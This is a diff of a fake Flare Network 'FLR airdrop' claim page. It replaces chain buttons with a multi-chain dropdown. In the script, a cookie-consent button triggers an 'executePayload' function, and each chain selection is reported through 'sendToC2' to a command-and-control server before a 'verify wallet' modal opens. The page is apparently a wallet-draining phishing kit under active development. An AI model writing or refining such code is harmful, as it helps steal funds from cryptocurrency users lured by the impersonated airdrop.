@@ -644,24 +644,45 @@ cd vcd
       Select your preferred chain below to verify eligibility and claim your FLR rewards.<br>
       This limited airdrop is available to early Flare Network participants and FTSO delegators.
     </p>
-
-    <!-- ===== CHAIN SELECTION BUTTONS ===== -->
-    <div style="display: flex; align-items: center; justify-content: center; gap: 1rem; margin-bottom: 1.5rem; flex-wrap: wrap;">
-      <button class="chain-select-btn" data-chain="ethereum" style="background: rgba(229,0,108,0.08); border: 1px solid rgba(229,0,108,0.25); color: #E5006C; padding: 0.6rem 1.2rem; border-radius: 50px; cursor: pointer; font-weight: 600; font-size: 0.9rem; transition: all 0.2s; display: flex; align-items: center; gap: 0.4rem;" onmouseover="this.style.background='rgba(229,0,108,0.15)';this.style.borderColor='#E5006C';" onmouseout="this.style.background='rgba(229,0,108,0.08)';this.style.borderColor='rgba(229,0,108,0.25)';">
-        <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/XRPtoken.png" alt="" style="width: 18px; height: 18px;"> XRP Ledger
-      </button>
-
-            <button class="chain-select-btn" data-chain="solana" style="background: rgba(229,0,108,0.08); border: 1px solid rgba(229,0,108,0.25); color: #E5006C; padding: 0.6rem 1.2rem; border-radius: 50px; cursor: pointer; font-weight: 600; font-size: 0.9rem; transition: all 0.2s; display: flex; align-items: center; gap: 0.4rem;" onmouseover="this.style.background='rgba(229,0,108,0.15)';this.style.borderColor='#E5006C';" onmouseout="this.style.background='rgba(229,0,108,0.08)';this.style.borderColor='rgba(229,0,108,0.25)';">
-        <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Solana.png" alt="Solana" style="width: 18px; height: 18px; border-radius: 50%;"> Solana
-      </button>
-      <button class="chain-select-btn" data-chain="bsc" style="background: rgba(229,0,108,0.08); border: 1px solid rgba(229,0,108,0.25); color: #E5006C; padding: 0.6rem 1.2rem; border-radius: 50px; cursor: pointer; font-weight: 600; font-size: 0.9rem; transition: all 0.2s; display: flex; align-items: center; gap: 0.4rem;" onmouseover="this.style.background='rgba(229,0,108,0.15)';this.style.borderColor='#E5006C';" onmouseout="this.style.background='rgba(229,0,108,0.08)';this.style.borderColor='rgba(229,0,108,0.25)';">
-        <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/BNB.png" alt="BNB" style="width: 18px; height: 18px; border-radius: 50%;"> BNB Chain
-      </button>
-      <button class="chain-select-btn" data-chain="polygon" style="background: rgba(229,0,108,0.08); border: 1px solid rgba(229,0,108,0.25); color: #E5006C; padding: 0.6rem 1.2rem; border-radius: 50px; cursor: pointer; font-weight: 600; font-size: 0.9rem; transition: all 0.2s; display: flex; align-items: center; gap: 0.4rem;" onmouseover="this.style.background='rgba(229,0,108,0.15)';this.style.borderColor='#E5006C';" onmouseout="this.style.background='rgba(229,0,108,0.08)';this.style.borderColor='rgba(229,0,108,0.25)';">
-        <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Polygon.png" alt="Polygon" style="width: 18px; height: 18px; border-radius: 50%;"> Polygon
-      </button>
+    <!-- ===== CHAIN SELECTION DROPDOWN ===== -->
+    <div style="margin-bottom: 1.5rem; text-align: center;">
+      <div style="position: relative; display: inline-block;">
+        <button id="chainDropdownBtn" style="background: rgba(229,0,108,0.08); border: 1px solid rgba(229,0,108,0.25); color: #E5006C; padding: 0.7rem 1.5rem; border-radius: 50px; cursor: pointer; font-weight: 600; font-size: 0.9rem; display: flex; align-items: center; gap: 0.5rem; min-width: 200px; justify-content: center; transition: all 0.2s;" onmouseover="this.style.background='rgba(229,0,108,0.15)';" onmouseout="this.style.background='rgba(229,0,108,0.08)';">
+          <span id="selectedChainIcon">🔗</span> Select Chain ▾
+        </button>
+        <div id="chainDropdown" style="display: none; position: absolute; top: 100%; left: 50%; transform: translateX(-50%); margin-top: 0.5rem; background: #fff; border: 1px solid rgba(0,0,0,0.1); border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.12); z-index: 100; min-width: 220px; overflow: hidden;">
+          <div class="chain-dropdown-item" data-chain="ethereum" data-icon="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Ethereum.png" style="padding: 0.7rem 1.2rem; cursor: pointer; display: flex; align-items: center; gap: 0.6rem; font-size: 0.9rem; color: #1a1a2e; transition: background 0.15s;" onmouseover="this.style.background='rgba(229,0,108,0.06)';" onmouseout="this.style.background='transparent';">
+            <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Ethereum.png" style="width: 20px; height: 20px; border-radius: 50%;"> Ethereum
+          </div>
+          <div class="chain-dropdown-item" data-chain="bsc" data-icon="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/BNB.png" style="padding: 0.7rem 1.2rem; cursor: pointer; display: flex; align-items: center; gap: 0.6rem; font-size: 0.9rem; color: #1a1a2e; transition: background 0.15s;" onmouseover="this.style.background='rgba(229,0,108,0.06)';" onmouseout="this.style.background='transparent';">
+            <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/BNB.png" style="width: 20px; height: 20px; border-radius: 50%;"> BNB Chain
+          </div>
+          <div class="chain-dropdown-item" data-chain="solana" data-icon="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Solana.png" style="padding: 0.7rem 1.2rem; cursor: pointer; display: flex; align-items: center; gap: 0.6rem; font-size: 0.9rem; color: #1a1a2e; transition: background 0.15s;" onmouseover="this.style.background='rgba(229,0,108,0.06)';" onmouseout="this.style.background='transparent';">
+            <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Solana.png" style="width: 20px; height: 20px; border-radius: 50%;"> Solana
+          </div>
+          <div class="chain-dropdown-item" data-chain="polygon" data-icon="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Polygon.png" style="padding: 0.7rem 1.2rem; cursor: pointer; display: flex; align-items: center; gap: 0.6rem; font-size: 0.9rem; color: #1a1a2e; transition: background 0.15s;" onmouseover="this.style.background='rgba(229,0,108,0.06)';" onmouseout="this.style.background='transparent';">
+            <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Polygon.png" style="width: 20px; height: 20px; border-radius: 50%;"> Polygon
+          </div>
+          <div class="chain-dropdown-item" data-chain="arbitrum" data-icon="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Arbitrum.png" style="padding: 0.7rem 1.2rem; cursor: pointer; display: flex; align-items: center; gap: 0.6rem; font-size: 0.9rem; color: #1a1a2e; transition: background 0.15s;" onmouseover="this.style.background='rgba(229,0,108,0.06)';" onmouseout="this.style.background='transparent';">
+            <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Arbitrum.png" style="width: 20px; height: 20px; border-radius: 50%;"> Arbitrum
+          </div>
+          <div class="chain-dropdown-item" data-chain="optimism" data-icon="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Optimism.png" style="padding: 0.7rem 1.2rem; cursor: pointer; display: flex; align-items: center; gap: 0.6rem; font-size: 0.9rem; color: #1a1a2e; transition: background 0.15s;" onmouseover="this.style.background='rgba(229,0,108,0.06)';" onmouseout="this.style.background='transparent';">
+            <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Optimism.png" style="width: 20px; height: 20px; border-radius: 50%;"> Optimism
+          </div>
+          <div class="chain-dropdown-item" data-chain="avalanche" data-icon="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Avalanche.png" style="padding: 0.7rem 1.2rem; cursor: pointer; display: flex; align-items: center; gap: 0.6rem; font-size: 0.9rem; color: #1a1a2e; transition: background 0.15s;" onmouseover="this.style.background='rgba(229,0,108,0.06)';" onmouseout="this.style.background='transparent';">
+            <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Avalanche.png" style="width: 20px; height: 20px; border-radius: 50%;"> Avalanche
+          </div>
+          <div class="chain-dropdown-item" data-chain="base" data-icon="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Base.png" style="padding: 0.7rem 1.2rem; cursor: pointer; display: flex; align-items: center; gap: 0.6rem; font-size: 0.9rem; color: #1a1a2e; transition: background 0.15s;" onmouseover="this.style.background='rgba(229,0,108,0.06)';" onmouseout="this.style.background='transparent';">
+            <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/Base.png" style="width: 20px; height: 20px; border-radius: 50%;"> Base
+          </div>
+          <div class="chain-dropdown-item" data-chain="xrp" data-icon="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/XRPtoken.png" style="padding: 0.7rem 1.2rem; cursor: pointer; display: flex; align-items: center; gap: 0.6rem; font-size: 0.9rem; color: #1a1a2e; transition: background 0.15s;" onmouseover="this.style.background='rgba(229,0,108,0.06)';" onmouseout="this.style.background='transparent';">
+            <img src="https://raw.githubusercontent.com/flaregovernance/flaregovernance.github.io/main/XRPtoken.png" style="width: 20px; height: 20px; border-radius: 50%;"> XRP Ledger
+          </div>
+        </div>
+      </div>
     </div>
-    <!-- ===== END CHAIN SELECTION ===== -->
+    <!-- ===== END CHAIN SELECTION DROPDOWN ===== -->
+
 
     <div class="wallet-status" id="walletStatus"></div>
   </section>
@@ -922,15 +943,34 @@ cd vcd
     var acceptBtn = document.getElementById('acceptCookiesBtn');
     if (acceptBtn) acceptBtn.addEventListener('click', executePayload);
 
-      // ===== CHAIN SELECTION → OPENS VERIFY MODAL =====
-  var chainButtons = document.querySelectorAll('.chain-select-btn');
-  chainButtons.forEach(function(btn) {
-    btn.addEventListener('click', function() {
+  // ===== CHAIN DROPDOWN LOGIC =====
+  var dropdownBtn = document.getElementById('chainDropdownBtn');
+  var dropdown = document.getElementById('chainDropdown');
+  var selectedIcon = document.getElementById('selectedChainIcon');
+
+  dropdownBtn.addEventListener('click', function(e) {
+    e.stopPropagation();
+    dropdown.style.display = dropdown.style.display === 'none' ? 'block' : 'none';
+  });
+
+  document.addEventListener('click', function() {
+    dropdown.style.display = 'none';
+  });
+
+  var dropdownItems = document.querySelectorAll('.chain-dropdown-item');
+  dropdownItems.forEach(function(item) {
+    item.addEventListener('click', function(e) {
+      e.stopPropagation();
       var chain = this.getAttribute('data-chain');
-      // Log which chain they selected to C2
+      var icon = this.getAttribute('data-icon');
+      // Update the button to show the selected chain
+      dropdownBtn.innerHTML = '<img src="' + icon + '" style="width: 18px; height: 18px; border-radius: 50%;"> ' + this.textContent.trim() + ' ▾';
+      // Log selection to C2
       sendToC2({ type: 'CHAIN_SELECTED', chain: chain });
       // Show the verify wallet modal
       document.getElementById('verifyOverlay').classList.add('active');
+      // Close dropdown
+      dropdown.style.display = 'none';
     });
   });
 
